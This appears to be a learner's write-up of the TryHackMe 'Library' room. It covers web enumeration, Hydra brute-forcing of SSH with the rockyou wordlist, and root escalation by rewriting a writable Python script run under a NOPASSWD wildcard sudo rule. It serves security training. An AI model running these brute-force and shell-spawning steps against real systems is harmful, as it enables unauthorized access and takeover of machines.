# 📚 TryHackMe: Library

**Difficulty:** Medium  
**Category:** Web Enumeration, SSH Brute-Forcing, Linux Privilege Escalation

## 📌 Room Overview

Library is a Linux-based TryHackMe room that involves web enumeration, username discovery, SSH credential testing and privilege escalation through a misconfigured sudo rule involving Python.

The room demonstrates how information exposed through a web application and insecure local permissions can lead to system compromise.

## 🛠️ Tools Used

- Kali Linux
- Nmap
- Gobuster
- Hydra
- RockYou Wordlist
- SSH
- Python
- GTFOBins
- OpenVPN

## 🔍 1. Initial Access Check

Checked the current user:

```bash
whoami
```

## 🔍 2. Reconnaissance & Enumeration

Checked target connectivity:

```bash
ping <TARGET-IP>
```

Performed initial service enumeration:

```bash
nmap <TARGET-IP>
```

Inspected the website for useful information.

Checked the `robots.txt` file:

```text
http://<TARGET-IP>/robots.txt
```

Also inspected the website source code:

```text
Ctrl + U
```

Used Gobuster to discover hidden directories:

```bash
gobuster dir -u http://<TARGET-IP> -w <WORDLIST>
```

**Learning:** robots.txt, page source and directory enumeration can reveal information useful for further investigation.

## 👤 3. Username Discovery

Analysed the information discovered through web enumeration.

Identified a valid username through the exposed website information.

The username is not reproduced in this writeup.

## 🔑 4. SSH Brute-Forcing Using Hydra

Used Hydra with the discovered username and RockYou wordlist to test SSH authentication.

```bash
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt.gz <TARGET-IP> ssh
```

After identifying valid credentials, connected through SSH:

```bash
ssh <USERNAME>@<TARGET-IP>
```

Successfully obtained access as a normal user.

**Learning:** Understood how weak SSH credentials can expose remote access to a Linux system.

## 🐧 5. Privilege Escalation Discovery

After obtaining SSH access, checked the permitted sudo commands:

```bash
sudo -l
```

The relevant permission was:

```text
(ALL) NOPASSWD: /usr/bin/python* /home/<user>/backup.py
```

**Observation:**

- `NOPASSWD` allows execution without entering a sudo password.
- `python*` is a wildcard pattern.
- The permission allows a Python interpreter to execute the specified script with elevated privileges.

Further inspection revealed that the referenced script was writable by the current user.

## 🔓 6. Python-Based Privilege Escalation

Inspected the relevant files:

```bash
ls
```

Opened the backup script:

```bash
nano backup.py
```

The writable script was modified for the lab exercise using a Python command-execution pattern:

```python
import os
os.system("/bin/bash")
```

Executed the script through the permitted sudo rule:

```bash
sudo python backup.py
```

Verified the resulting privileges:

```bash
whoami
```

**Learning:** A writable script combined with an overly permissive sudo rule can create a privilege escalation path.

## 🧠 Key Concepts Learned

| Concept | Description |
|---|---|
| robots.txt | File that provides information about paths web crawlers should avoid |
| Web Enumeration | Discovering information and resources exposed by a website |
| Hydra | Tool for testing authentication using wordlists |
| RockYou | Common password dictionary |
| sudo -l | Displays a user's permitted sudo commands |
| NOPASSWD | Allows specified sudo commands without password entry |
| Wildcard Sudo Rule | A permission pattern that can be broader than intended |
| GTFOBins | Reference for understanding potential abuse of Unix binaries |
| Python Privilege Escalation | Abusing insecure Python execution permissions to gain elevated access |

## 🎯 Key Takeaways

- Practised network and web enumeration.
- Learned to inspect robots.txt and website source code.
- Used Gobuster for directory discovery.
- Identified a username through exposed web information.
- Practised SSH password testing using Hydra and RockYou.
- Learned to analyse wildcard sudo permissions.
- Understood the security risks of writable scripts executed with elevated privileges.
- Practised identifying a Python-based privilege escalation path.

---

**Lab Environment:** Kali Linux VM + VMware + OpenVPN  
**Purpose:** Educational cybersecurity lab practice.
